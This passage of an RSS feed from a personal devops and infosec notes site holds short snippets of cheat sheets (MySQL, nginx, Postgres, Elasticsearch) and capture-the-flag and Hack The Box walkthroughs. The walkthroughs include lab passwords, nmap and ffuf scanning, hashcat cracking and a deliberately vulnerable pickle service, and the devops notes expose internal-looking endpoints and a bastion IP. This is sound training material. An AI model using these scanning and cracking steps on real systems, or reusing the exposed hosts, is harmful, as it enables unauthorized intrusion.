locks</description></item><item><title/><link>https://www.darvein.net/devops/linux/systemctl_cheatsheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/linux/systemctl_cheatsheet/</guid><description> Systemctl cheatsheet # Check logs for a particular service journalctl -u service-name.service</description></item><item><title/><link>https://www.darvein.net/devops/mysql/mysql/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/mysql/mysql/</guid><description>Mysql tips Create user in AWS RDS and grant permissions like a master
CREATE USER &amp;#39;jacob&amp;#39;@&amp;#39;%&amp;#39; IDENTIFIED BY &amp;#39;xxxxxxxx&amp;#39;; GRANT SELECT,INSERT,UPDATE,DELETE,DROP on synapbox_qa.* TO &amp;#39;jacob&amp;#39;@&amp;#39;%&amp;#39;; or GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, PROCESS, REFERENCES, INDEX, ALTER, SHOW DATABASES, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE, REPLICATION CLIENT, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, CREATE USER, EVENT, TRIGGER, LOAD FROM S3, SELECT INTO S3, INVOKE LAMBDA ON synapbox_qa.</description></item><item><title/><link>https://www.darvein.net/devops/nginx/nginx-certbot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/nginx/nginx-certbot/</guid><description>Nginx and certbot sudo apt update sudo apt install -f certbot python3-certbot-nginx nginx sudo certbot --nginx -d acme.net -d www.acme.net sudo vim /etc/nginx/sites-available/acme.net #Successfully received certificate. #Certificate is saved at: /etc/letsencrypt/live/acme.net/fullchain.pem #Key is saved at: /etc/letsencrypt/live/acme.net/privkey.pem sudo crontab -e 0 1 * * * /usr/bin/certbot renew --quiet Nginx config:
client_max_body_size 100M; # Enable gzip compression #gzip on; gzip_vary on; gzip_proxied any; gzip_comp_level 6; gzip_types text/plain text/css text/xml application/json application/javascript application/rss+xml application/atom+xml image/svg+xml; # Cache settings proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=my_cache:10m max_size=1g inactive=60m; proxy_cache_key &amp;#34;$scheme$request_method$host$request_uri&amp;#34;; server { listen 80; server_name acme.</description></item><item><title/><link>https://www.darvein.net/devops/others/compressions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/others/compressions/</guid><description>Compression notes There are different ways to compress in a linux environment with general compression algorithms and so.
Tar and GZIP tar:
GNU &amp;rsquo;tar&amp;rsquo; saves many files together into a single tape or disk archive, and can restore individual files from the archive.
gzip
Compress or uncompress FILEs (by default, compress FILES in-place).
Both are different tools, but tar can call bzip in order to compress an archived file.</description></item><item><title/><link>https://www.darvein.net/devops/others/elasticsearch/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/others/elasticsearch/</guid><description>Elasticsearch cheatsheet export HST=https://elasticsearch.devbox-apps.acme.com # see why not allocate shareds curl -s -XGET localhost:9200/_cluster/allocation/explain?pretty # check unallocated shareds curl -s -XGET localhost:9200/_cat/shards? # check installed plugins curl -X GET &amp;#34;localhost:9200/_cat/plugins?v&amp;amp;s=component&amp;amp;h=name,component,version,description&amp;amp;pretty&amp;#34; # check ES health curl -sX GET &amp;#34;$HST/_cluster/health&amp;#34; | jq curl -sX GET &amp;#34;https://vpc-msops-es-cluster-edwk7ppi4dw5gkcpqbqangmbvm.us-west-2.es.amazonaws.com/_cluster/health&amp;#34; | jq # stats curl -X GET &amp;#34;localhost:9200/_nodes/stats&amp;#34; | jq curl -X GET &amp;#34;localhost:9200/_nodes/stats/indices&amp;#34; | jq curl -X GET &amp;#34;http://localhost:9200/_stats?all=true&amp;#34; | jq # List indexes curl -s &amp;#34;$HST/_aliases?</description></item><item><title/><link>https://www.darvein.net/devops/others/others-tools/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/others/others-tools/</guid><description>Other useful tools Table of Content Other useful tools Table of Content Content My bash aliases Devops Coding Infosec More Arch packages Content My bash aliases _s: Chatgpt3 + Azure cognitive search _sc: Chatgpt3 _ddgr: Search on Duckduckgo, put 9 results on nvim buffers _web: Get a web page and load it on nvim _tvim: copy/paste current terminal buffer to nvim _dbox_share: Share local file and get a Dropbox URL _twitter: Search something on twitter ( https://github.</description></item><item><title/><link>https://www.darvein.net/devops/others/ranger/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/others/ranger/</guid><description> Ranger - file navigator in terminal Tips oa # sort by time os # sort by size Mh # show human-readable date Mp # show permissions yp # yank full path of current file Shift+S # exit ranger on the current new directory Resources ranger cheatsheet: https://dquinton.github.io/debian-install/files/ranger-keybinds_quinton.pdf</description></item><item><title/><link>https://www.darvein.net/devops/others/ssl/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/others/ssl/</guid><description>SSL Cheatsheet # View single certificate echo | openssl s_client -showcerts -servername [gnupg.org](http://gnupg.org) -connect [gnupg.org:443](http://gnupg.org:443) 2&amp;gt;/dev/null | openssl x509 -inform pem -noout -text | tee output.log openssl pkcs7 -print_certs -in old.p7b -out new.crt # openssl pkcs7 -print_certs -in old.p7b -out new.cer # generate RSA public/private key openssl genrsa -des3 -out darvein.pem 2048 # export RSA public key openssl rsa -in private.pem -outform PEM -pubout -out public.pem # export RSA private key openssl rsa -in private.</description></item><item><title/><link>https://www.darvein.net/devops/others/tcpdump/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/others/tcpdump/</guid><description>Tcpdump tcpdump sniff on docker containers Check first the container ip address: docker inspect $container Get the interface network ifconfig | less Then TCPDump it: # This is an nginx container sudo tcpdump -i br-11a73f6ac535 -A -p -s 0 -l -vv -nn &amp;#39;host 172.22.0.50&amp;#39; # GET|POST packets sudo tcpdump -i br-11a73f6ac535 -A -p -s 0 -l -vv -nn &amp;#39;tcp[((tcp[12:1] &amp;amp; 0xf0) &amp;gt;&amp;gt; 2):4] = 0x47455420&amp;#39; # Receive on django sudo tcpdump -i br-11a73f6ac535 -A -p -l -vvvs 1500 -nn -SX &amp;#39;src 172.</description></item><item><title/><link>https://www.darvein.net/devops/others/tmux/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/others/tmux/</guid><description> Tmux tips # General shortcuts prefix + u # urls picker prefix + C # new session with custom name prefix + c # new session prefix + I # install plugins prefix + f # open files prefix + , # rename current window # copycat prefix + ctrl-f - simple file search prefix + ctrl-g - jumping over git status files (best used after git status command) prefix + alt-h - jumping over SHA-1/SHA-256 hashes (best used after git log command) prefix + ctrl-u - url search (http, ftp and git urls) prefix + ctrl-d - number search (mnemonic d, as digit) prefix + alt-i - ip address search</description></item><item><title/><link>https://www.darvein.net/devops/others/vim/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/others/vim/</guid><description>Vim tips Content Vim tips Content Motions Moving things around Edits Files Buffers Search Commands Powerful plugins Git mkdx Copilot Folding Motions ciw: Change the inner word dwi: Delete current word and enter edit mode d$ or D: delete all after current position $: go to the last char normal-mode w and b: move a word forward or backwards daw: delete from the current char til the first letter on next word d9w: delete 9 words dap: delete around paragraph dd: delete a line 2dd: delete two lines u and ctrl+o: undo and redo editions 4gt: Go to Tab number 4 more of this:</description></item><item><title/><link>https://www.darvein.net/devops/postgres/postgres_cheatsheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/postgres/postgres_cheatsheet/</guid><description>Postgresql general cheatsheet General \dt # list all tables \l # list all databases \d # describe table #ssh jumpbox: ssh -i ~/.ssh/devops-synapbox.pem -N -L 5432:synapbox-dev-postgresql.cluster-ro-cxt0zmlbsvfo.us-west-2.rds.amazonaws.com:5432 ec2-user@52.24.146.217 Export and import database pg_dump -h $HOST -U $USER -W -F t $DBNAME &amp;gt; dump.tar pg_restore -h $HOST -d $DBNAME dump.tar -c -U $USER Misc # create user and database sudo su - postgres createuser dennis createdb -O dennis dennis # test user psql -h localhost -d dennis -U dennis -W psql -h localhost -d postgres -U postgres -W psql -h 192.</description></item><item><title/><link>https://www.darvein.net/devops/postgres/psql_sqls/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/postgres/psql_sqls/</guid><description> cheatsheet psql remove all tables in the current schema DO $$ DECLARE r RECORD; BEGIN FOR r IN (SELECT tablename FROM pg_tables WHERE schemaname = current_schema()) LOOP EXECUTE &amp;#39;DROP TABLE IF EXISTS &amp;#39; || quote_ident(r.tablename) || &amp;#39; CASCADE&amp;#39;; END LOOP; END $$;</description></item><item><title/><link>https://www.darvein.net/devops/talks/bash-vs-zsh/bash-zsh/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/talks/bash-vs-zsh/bash-zsh/</guid><description>Bash vz ZSH title: Bash vs ZSH author: Dennis Ruiz date: 22/10/21 theme: Copenhagen Shell features Shell feature:
Jobs Input, Output and redirections Aliases History Completion Wildcard and expansiosn config files bash:
/etc/profile /etc/bash.bashrc ~/.bashrc ~/.bash_profile ~/.bash_login ~/.profile ~/.bash_logout zsh:
/etc/zsh/zshenv ~/.zshenv /etc/zsh/zprofile ~/.zprofile /etc/zsh/zshrc ~/.zshrc /etc/zsh/zlogin ~/.zlogin ~/.zlogout /etc/zsh/zlogout Global qualifiers ls **/*.(dll|py) # list the 3rd file ls *(.[3]) # match files only, no dirs, no special files du -h *(.</description></item><item><title/><link>https://www.darvein.net/devops/talks/intro-linux-shell/intro-linux-shell/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/talks/intro-linux-shell/intro-linux-shell/</guid><description>Trivial question title: Introduction to Linux Shell author: Dennis Ruiz date: 7/3/21 theme: Copenhagen Why does sudo id works and sudo cd does not?
Why does sudo id works and sudo cd does not?
Because cd is a builtin command not a program (executable).
$ compgen -b jobs exit bg pwd source eval alias cd export echo wait kill fg ... What is a Linux shell? It is a command-line interpreter software that can be interactive or scripted.</description></item><item><title/><link>https://www.darvein.net/devops/talks/jenkins-lab/jenkins/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/talks/jenkins-lab/jenkins/</guid><description>Jenkins overview &amp;amp; installation Jenkins is an automation server.
We can use it to automate almost anything we need or want.
Continuous integration jobs Continuous delivery jobs Ad-hoc jobs Jenkins installer can be found for:
Docker Kubernetes Linux macOS WAR files Windows Single ad-hoc jobs Freestyle Pipeline (declarative) Pipeline from a git repository Multi-branch pipeline Secrets management Stores sensitive information:
SSH Keys Certificates Passwords, Tokens Jenkins slaves Static slave Global configuration tool AWS EC2 Auto-provisioning slaves Slack notifications Jenkins pipelines Scripted vs Declarative Questions &amp;amp; Answers Time for questions!</description></item><item><title/><link>https://www.darvein.net/devops/talks/productivity/productivity-talk-darvein/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/talks/productivity/productivity-talk-darvein/</guid><description>Productivity 101 Being productive is to regulary produce something desired or expected in a timely manner.
Acceptable results and satisfaction can be considered a way to measure success.
Resources and priorities First of all, size and measure mentally what you will do and how you will do it:
::: columns :::: column
Resources Costs Time Quality :::: :::: column
Priority Urgent Important :::: ::: We can&amp;rsquo;t always have high quality, cheap and fast, we have to trade off resources.</description></item><item><title/><link>https://www.darvein.net/devops/terraform/talk-terraform/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/terraform/talk-terraform/</guid><description>Terraform talk (30min) Topics to cover: what is for terraform How it works TF main parts (provider, resources, variables, outputs, backend, templates/data, provisioners, null_resource, data+program+bash, ) Where not to use it / when to use it Syntax and programming + tricks (variables types,maps,locals, tulle, objects) Logic: loops, conditionals, TF env vars for vars Modules usage and creation Terraform registry Workspaces Remote states Secrets Locking state (s3, dynamodb) Integrations: Vault, ansible, chef, packer, user data , aws secrets, Terraform and docker (ECS/EKS) Terraform and machine learning?</description></item><item><title/><link>https://www.darvein.net/devops/terraform/terraform_basics/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/terraform/terraform_basics/</guid><description> Terraform basics How to terraform import Link: https://www.dropbox.com/s/qdlgiytja6u3adc/2022-09-13_19-52-07.mp4?dl=0&amp;amp;dl=0</description></item><item><title/><link>https://www.darvein.net/devops/webapps/wordpress/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/webapps/wordpress/</guid><description>Wordpress Content Installation Given an Ubuntu 22.04 Machine
sudo apt update sudo apt-get upgrade -y sudo apt install -f php-fpm nfs-kernel-server nginx php-mysql sudo apt install -f php8.1-mysql php8.1-mbstring php8.1-xml php8.1-curl sudo apt install -f memcached libmemcached-tools -y Check the nginx config:
client_max_body_size 50M; server { listen 80; listen [::]:80; root /var/www/acme.com/html; server_name _; index index.php; charset utf-8; access_log /var/log/nginx/wordpress_access.log; error_log /var/log/nginx/wordpress_error.log; location / { try_files $uri $uri/ /index.php?$args; } location ~ \.</description></item><item><title/><link>https://www.darvein.net/infosec/00-infosec_todos/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/00-infosec_todos/</guid><description>Infosec TODOS Board TODOs Rank on HTB &amp;amp; TryHackMe Rank H1 &amp;amp; Bugcrowd Book Kindle: The Web Application Hacker&amp;rsquo;s Handbook.: Finding and Exploiting Security Flaws Book: Web Application Vulnerabilities: Detect, Exploit, Prevent Book: Web Application Obfuscation: &amp;lsquo;-/WAFs..Evasion..Filters//alert(/Obfuscation/)-&amp;rsquo; Some other TODOs Build Infosec Forensics Roadmap Pentesterlabs: https://pentesterlab.com/badges/unix https://www.udemy.com/course/cissp-domain-1-2/ CTF101: https://ctf101.org/web-exploitation/overview /home/n0kt/Dropbox/Docs/Infosec: /home/n0kt/Dropbox/Docs/Infosec/cpp-hackers-guide-steve-oualline.pdf Review videos: https://www.youtube.com/@HackingBolivia404/streams Review todays cryptography roadmaps: DES, SHA256, SHA512, Blowfish Research initial: Cryptocurrency https://tryhackme.com/ https://portswigger.net/web-security https://www.vulnhub.com/ https://overthewire.org/wargames/ https://www.</description></item><item><title/><link>https://www.darvein.net/infosec/chromium/chrome-arch/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/chromium/chrome-arch/</guid><description> Chromium architecture highlights renderer host each chrome instance has its own renderes and processes same domains can use the same process Chrome components V8 ChromeOS Chrome Sandbox JIT Blink (instead of Webkit) notes if a tab crashes basically shows a sad face which says the previous process is gone and the sad face is a new one, plz don&amp;rsquo;t F5</description></item><item><title/><link>https://www.darvein.net/infosec/chromium/exploiting-chrome-talk/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/chromium/exploiting-chrome-talk/</guid><description> Introduction to Google Chrome Explotation (presentation) Agenda Need to learn asm, c/c++ chromium architecture bit of linux/android/osx/windows shellcodes webassembly Chromium architecture and dependencies Chrome and CVEs in 2021 puzzlemaker magnitude explit kit Chrome and chaining of CVEs + OS exploits?</description></item><item><title/><link>https://www.darvein.net/infosec/chromium/intro/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/chromium/intro/</guid><description>Introduction to Google Chrome Based browsers based in chromium:
Brave browser Vivaldi Edge Steam Chrome uses: apple webkit, mozilla firefox? and part of chromium project
google foked webkit and named it Blink Engine Techniques of explotations Semantic Equivalent Transform (SET): program transforming JS seed generates new JSes translates: a.js -&amp;gt; (ast, mutate) -&amp;gt; b.js builtins, methods, scope, variable, type, signature loopenize (for, while), functionize, empty loop, garbage collection, nontype based, conditionize, repeat fuzzers?</description></item><item><title/><link>https://www.darvein.net/infosec/ctf-notes/h1/easy-h1-theormostat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/ctf-notes/h1/easy-h1-theormostat/</guid><description>Easy - H1 Thermostat Category: Android
We firstly get the challenge APK file:
~➤ du -hs thermostat.apk 2.5M thermostat.apk ~➤ file thermostat.apk thermostat.apk: Android package (APK), with AndroidManifest.xml, with APK Signing Block Let&amp;rsquo;s now decompile, something went wrong though but I don&amp;rsquo;t think its critical, we still have a bunch of files to read.
~z➤ jadx -d src thermostat.apk INFO - loading ... INFO - processing ... ERROR - finished with errors, count: 3 ~z/src➤ cloc .</description></item><item><title/><link>https://www.darvein.net/infosec/ctf-notes/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/ctf-notes/readme/</guid><description>Capture The Flag Notes Index Done.</description></item><item><title/><link>https://www.darvein.net/infosec/ctfs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/ctfs/</guid><description> Capture the flag CTFs CTFS &amp;#x1F5D2; IO NetGarage 2 &amp;#x1F5D2; IO Netgarage &amp;#x1F5D2; Overthewire &amp;#x1F5D2; Overthewire Leviathan &amp;#x1F5D2; Natas challenges &amp;#x1F5D2; Amateria &amp;#x1F5D2; Blackbox Pentesterlabs &amp;#x1F4C1; challenges &amp;#x1F4C1; easy &amp;#x1F4C1; racecar &amp;#x1F5D2; easy - racecar &amp;#x1F4C1; machines &amp;#x1F4C1; easy &amp;#x1F5D2; easy - Analytics &amp;#x1F5D2; easy - Busqueda &amp;#x1F5D2; easy - Cozyhosting &amp;#x1F5D2; easy - Inject &amp;#x1F5D2; easy - Keeper &amp;#x1F5D2; easy - MetaTwo Machine &amp;#x1F5D2; easy - MonitorsTwo (machine) &amp;#x1F5D2; easy - PC Machine &amp;#x1F5D2; easy - Photobomb &amp;#x1F5D2; easy - pilgrimage &amp;#x1F5D2; easy - Precious &amp;#x1F5D2; easy - Sau &amp;#x1F5D2; easy - Shoppy &amp;#x1F5D2; easy - Soccer &amp;#x1F5D2; easy - Stocker &amp;#x1F5D2; easy - Topology (machine) &amp;#x1F4C1; hard &amp;#x1F5D2; hard - Gofer &amp;#x1F5D2; hard - snoopy &amp;#x1F4C1; medium &amp;#x1F5D2; medium - Format &amp;#x1F5D2; medium - Jupiter &amp;#x1F5D2; medium - OnlyForYou &amp;#x1F5D2; medium - Sandworm &amp;#x1F5D2; medium - Zipping Pentesterlabs &amp;#x1F5D2; Essential badge &amp;#x1F5D2; PCAPs &amp;#x1F5D2; Unix badge &amp;#x1F5D2; White badge</description></item><item><title/><link>https://www.darvein.net/infosec/ctfs/io.netgarage.org/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/ctfs/io.netgarage.org/</guid><description>IO NetGarage 2 SSH Access:
ssh -p 2224 level1@io.netgarage.org level 1 ❮ ssh -p 2224 level1@io.netgarage.org
Just read the ~/README, challenges are in /levels
level1@io:/levels$ ls -ltra level01 -r-sr-x--- 1 level2 level1 1184 Jan 13 2014 level01 level1@io:/levels$ ./level01 Enter the 3 digit passcode to enter: 123 Checking the asm code:
level1@io:/levels$ objdump -d level01 level01: file format elf32-i386 Disassembly of section .text: 08048080 &amp;lt;_start&amp;gt;: 8048080: 68 28 91 04 08 push $0x8049128 8048085: e8 85 00 00 00 call 804810f &amp;lt;puts&amp;gt; 804808a: e8 10 00 00 00 call 804809f &amp;lt;fscanf&amp;gt; 804808f: 3d 0f 01 00 00 cmp $0x10f,%eax 8048094: 0f 84 42 00 00 00 je 80480dc &amp;lt;YouWin&amp;gt; 804809a: e8 64 00 00 00 call 8048103 &amp;lt;exit&amp;gt; Notice the cmp $0x10f,%eax, a comparision is being made there.</description></item><item><title/><link>https://www.darvein.net/infosec/ctfs/io.netgarage.org_8064/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/ctfs/io.netgarage.org_8064/</guid><description>IO Netgarage io.netgarage.org:8064
io.netgarage.org:8064
level1 ssh -p2264 level1@io.netgarage.org objdump -D /levels/level01 | grep cmp 804808f: 3d 0f 01 00 00 cmp $0x10f,%eax python &amp;gt;&amp;gt;&amp;gt; print int(&amp;#34;0x10f&amp;#34;, 16) 271 level1@io:/levels$ /levels/level01 Enter the 3 digit passcode to enter: 271 cat /home/level2/.pass level2 level3 level4 level5 level6 level7 level8 level9 level10 level11 level12 level13 level14 level15 level16 level17 level18 level19 level20
#bugbounty/io-netgarage-org</description></item><item><title/><link>https://www.darvein.net/infosec/ctfs/overthewire_bandit/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/ctfs/overthewire_bandit/</guid><description>Overthewire Notas de http://overthewire.org/wargames/bandit/ Url: http://overthewire.org/wargames/bandit/bandit0.html Acceso: ssh -p 2220 bandit13@bandit.labs.overthewire.org Level 0 bandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level 1 # ... CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 bandit1@bandit:~$ find . -type f -exec cat {} \; Level 2 bandit2@bandit:~$ cat spaces\ in\ this\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Level 3 bandit3@bandit:~$ cat inhere/.hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB Level 4 bandit4@bandit:~$ find . -type f -exec file {} \; ./inhere/-file09: data ./inhere/-file06: data ./inhere/-file01: data ./inhere/-file02: data ./inhere/-file05: data ./inhere/-file03: data .</description></item><item><title/><link>https://www.darvein.net/infosec/ctfs/overthewire_leviathan/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/ctfs/overthewire_leviathan/</guid><description>Overthewire Leviathan info SSH: ssh -p 2223 leviathan.labs.overthewire.org -l leviathan0 Passwords: /etc/leviathan_pass
0-&amp;gt;1 leviathan0@leviathan:~$ grep -i pass .backup/bookmarks.html &amp;lt;DT&amp;gt;&amp;lt;A HREF=&amp;#34;http://www.goshen.edu/art/ed/teachem.htm&amp;#34; ADD_DATE=&amp;#34;1146092098&amp;#34; LAST_CHARSET=&amp;#34;ISO-8859-1&amp;#34; ID=&amp;#34;98012771&amp;#34;&amp;gt;Pass it &amp;lt;DT&amp;gt;&amp;lt;A HREF=&amp;#34;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m&amp;#34; ADD_DATE=&amp;#34;1155384634&amp;#34; LAST_CHARSET=&amp;#34;ISO-8859-1&amp;#34; ID=&amp;#34;rdf:#$2wIU71&amp;#34;&amp;gt;password to leviathan1&amp;lt;/A&amp;gt; 1-&amp;gt;2 leviathan1@leviathan:~$ ls -la check -r-sr-x--- 1 leviathan2 leviathan1 7452 Aug 26 2019 check leviathan1@leviathan:~$ ltrace ./check __libc_start_main(0x804853b, 1, 0xffffd794, 0x8048610 &amp;lt;unfinished ...&amp;gt; printf(&amp;#34;password: &amp;#34;) = 10 getchar(1, 0, 0x65766f6c, 0x646f6700password: foo ) = 102 getchar(1, 0, 0x65766f6c, 0x646f6700) = 111 getchar(1, 0, 0x65766f6c, 0x646f6700) = 111 strcmp(&amp;#34;foo&amp;#34;, &amp;#34;sex&amp;#34;) = -1 puts(&amp;#34;Wrong password, Good Bye .</description></item><item><title/><link>https://www.darvein.net/infosec/ctfs/overthewire_natas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/ctfs/overthewire_natas/</guid><description>Natas challenges http://natas0.natas.labs.overthewire.org/ level 0 ~» curl -s http://natas0.natas.labs.overthewire.org -u natas0:natas0 | ag pass
You can find the password for the next level on this page.
level 1 ~» curl -s -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org | ag &amp;ldquo;the pass&amp;rdquo; You can find the password for the
level 2 ~» curl -s -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 eve:zo4mJWyNj2 mallory:9urtcpzBmH
level 3 ~» curl -s -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</description></item><item><title/><link>https://www.darvein.net/infosec/ctfs/smashthestack.org_amateria/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/ctfs/smashthestack.org_amateria/</guid><description>Amateria URL: http://amateria.smashthestack.org:89/ Conexión: ssh -p2229 levelX@amateria.smashthestack.org Level 0 source code El código vulnerable corriendo un servicio
#!/usr/bin/python import socket import cPickle import os import sys import signal PORT = 54321 def handle(cs, addr): print &amp;#34;Conn from&amp;#34;, addr cs.sendall(&amp;#34;HAI\n&amp;#34;) try: l = cPickle.loads(cs.recv(1024)) s = sum(l) cs.sendall(&amp;#34;%d\n&amp;#34; % s) except: cs.sendall(&amp;#34;fail :(\n&amp;#34;) cs.sendall(&amp;#34;bye\n&amp;#34;) cs.close() signal.signal(signal.SIGCHLD, signal.SIG_IGN) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&amp;#34;0.0.0.0&amp;#34;, PORT)) s.listen(100) while 1: (cs, addr) = s.accept() pid = os.</description></item><item><title/><link>https://www.darvein.net/infosec/ctfs/smashthestack.org_blackbox/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/ctfs/smashthestack.org_blackbox/</guid><description>Blackbox smashthestack.org blackbox ssh -l level1 blackbox.smashthestack.org -p 2225
Level1 ssh -l level1 blackbox.smashthestack.org -p 2225
level1@blackbox:~$ strings login2 ... PassFor2 ... level1@blackbox:~$ ./login2 Access Code: PassFor2 sh-3.1$ b0wer:~ tenazas$ ssh -l level2 blackbox.smashthestack.org -p 2225 level2@blackbox.smashthestack.org&amp;#39;s password: Last login: Tue Jan 22 23:28:24 2019 from 213.91.183.174 Level2 ssh -l level1 blackbox.smashthestack.org -p 2225
Level3 Level4
#bugbounty/smashthestack</description></item><item><title/><link>https://www.darvein.net/infosec/htb-notes/machines/easy/codify/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb-notes/machines/easy/codify/</guid><description>Easy - Codify (machine) User flag Leaked info from html:
support@codify.htb Nmap scanning:
../p8/codify➤ sudo nmap -n -Pn -sV -O -T4 codify.htb ... 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 3000/tcp open http Node.js Express framework ... There is a place where we can run commands: The app is using this lib &amp;#x1f4be; vm2 v3.9.16 Ok, someone already published a CVE for a known vulnerability: https://github.</description></item><item><title/><link>https://www.darvein.net/infosec/htb-notes/machines/easy/devvortex/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb-notes/machines/easy/devvortex/</guid><description>Devvortex - Easy Machine URL: https://app.hackthebox.com/machines/Devvortex User Flag Let&amp;rsquo;s start reviewing the machine:
~z➤ curl -I devvortex.htb HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Fri, 29 Dec 2023 01:37:06 GMT Content-Type: text/html Content-Length: 18048 Last-Modified: Tue, 12 Sep 2023 17:45:54 GMT Connection: keep-alive ETag: &amp;#34;6500a3d2-4680&amp;#34; Accept-Ranges: bytes Leaked some info from HTML src:
info@DevVortex.htb By scanning the sub-domains I found this:
~z➤ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devvortex.htb/ -H &amp;#34;Host: FUZZ.</description></item><item><title/><link>https://www.darvein.net/infosec/htb-notes/machines/medium/surveillance/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb-notes/machines/medium/surveillance/</guid><description> Surveillance - Medium Machine User Flag &amp;hellip;.. Cracking it with hashcat:
../machines/medium➤ hashcat -m 3200 -a 0 hash.txt /usr/share/dict/rockyou.txt --force hashcat (v6.2.6) starting ... ******************:***************** And&amp;hellip; we are in!
